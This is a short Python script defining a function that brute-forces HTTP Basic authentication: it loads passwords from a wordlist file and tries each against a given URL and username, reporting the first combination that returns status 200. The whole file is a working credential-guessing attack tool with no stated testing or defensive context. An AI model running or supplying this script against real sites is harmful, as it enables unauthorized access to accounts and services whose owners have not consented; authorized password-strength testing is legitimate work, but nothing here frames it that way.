import requests
from requests.auth import HTTPBasicAuth

def http_brute_force(url, username, wordlist_path):
    print(f"\n[+] Starting brute force on {url}...")
    try:
        with open(wordlist_path, "r") as file:
            passwords = file.read().splitlines()
    except:
        print("[-] Wordlist not found!")
        return

    for password in passwords:
        response = requests.get(url, auth=HTTPBasicAuth(username, password))
        if response.status_code == 200:
            print(f"[!!] Success: {username}:{password}")
            return
        else:
            print(f"[-] Failed: {username}:{password}")
    print("[-] Brute force failed.")